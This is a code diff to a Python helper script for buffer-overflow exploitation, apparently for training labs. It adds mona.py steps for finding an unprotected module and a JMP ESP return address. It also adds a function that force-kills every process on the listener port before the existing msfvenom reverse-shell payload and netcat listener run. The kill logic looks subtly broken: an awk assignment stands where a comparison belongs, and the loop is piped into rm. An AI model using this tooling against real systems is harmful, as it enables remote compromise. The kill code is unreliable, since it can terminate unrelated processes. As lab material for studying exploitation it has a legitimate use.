@@ -29,6 +29,21 @@ def bof_steps():
         '''))
 
 
+def finding_the_right_module():
+    print(textwrap.dedent(
+        '''
+        1.  Look for a DLL that has no memory protections using mona.py
+        2.  Type in: !mona modules
+        3.  Look for something attached to program we are attacking that shows false for all these memory protections: Rebase | SafeSEH | ASLR  | NXCompat |
+        4.  Find the instruction JMP ESP in module: !mona find -s "\\xff\\xe4" -m <module .dll>
+        5.  Copy the return address and modify python script with return address in little endian (reverse order) 
+            •  Example of reverse order:
+               ◇ original address: 625011AF
+                  ▪ reverse order: \\xaf\\x11\\x50\\x62
+        '''
+    ))
+
+
 def finding_offset():
     pattern_create = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb"
     pattern_offset = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb"
@@ -87,7 +102,14 @@ def generate_payload():
         [msfvenom, switch_payload, payload, lhost, lport, no_crash, switch_format, format, switch_architecture,
          architecture, switch_badchars, badchars])
 
+    kill_port(lport)  # Kill all processes listening on local port
     nc_listener(lport)
+
+
+def kill_port(lport):
+    subprocess.run("touch pid.txt", shell=True)
+    subprocess.run(f"lsof -i :{lport}" + " | awk 'NR=2 { print$2 }' | grep -v 'PID' > pid.txt", shell=True)
+    subprocess.run("while read line; do kill -9 $line; done < pid.txt | rm pid.txt", shell=True)
 
 
 def nc_listener(lport):
@@ -101,6 +123,8 @@ def main():
     finding_offset()
 
     bad_characters()
+
+    finding_the_right_module()
 
     generate_payload()
 
